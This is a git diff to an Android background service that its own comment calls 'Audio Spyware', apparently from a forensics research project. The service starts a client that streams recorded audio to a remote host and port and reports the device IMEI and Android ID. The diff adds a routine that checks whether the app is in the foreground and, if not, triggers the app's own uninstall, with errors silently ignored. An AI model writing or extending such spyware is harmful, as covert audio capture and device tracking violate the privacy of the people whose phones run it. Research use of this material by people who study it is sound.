@@ -1,18 +1,23 @@
 package com.forensic.unipg.silenceaudiorecording;
 
 import android.Manifest;
+import android.app.ActivityManager;
 import android.app.Service;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.os.IBinder;
 import android.provider.Settings;
 import android.support.annotation.Nullable;
 import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import java.util.List;
 
 /**
  * Created by Gabriele on 30/05/16.
@@ -80,6 +85,41 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         }
         return true;
     }
+    //get activity is running
+    public boolean isActivityRunning()
+    {
+        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+        List<ActivityManager.RunningAppProcessInfo> tasks = manager.getRunningAppProcesses();
+
+        for (ActivityManager.RunningAppProcessInfo task : tasks)
+        {
+            if(task.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND &&
+               task.importanceReasonCode == ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN)
+            {
+                return true;
+            }
+        }
+        return false;
+    }
+    //uninstall this app
+    void uninstallApp()
+    {
+        try
+        {
+            if(!isActivityRunning())
+            {
+                Uri packageURI = Uri.parse("package:" + SilenceAudioRecordingActivity.class.getPackage().getName());
+                Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
+                uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+                startActivity(uninstallIntent);
+            }
+        }
+        catch (Exception e)
+        {
+            //ignore
+        }
+    }
+
 
     @Override
     public void run()
@@ -95,7 +135,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
                 //re-try to restart
                 if(canRecordAudio())
                 {
-                    RakClient.start(mInfo.mHost, mInfo.mPort);
+                    RakClient.start(this,mInfo.mHost, mInfo.mPort);
                 }
                 //sleep thread
                 try
@@ -131,7 +171,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         // Start RakNet client Audio Spyware
         if(canRecordAudio())
         {
-            RakClient.start(mInfo.mHost, mInfo.mPort);
+            RakClient.start(this,mInfo.mHost, mInfo.mPort);
         }
         RakClient.setIMEI(getIMEI());
         RakClient.setAndroidID(getAndroidID());
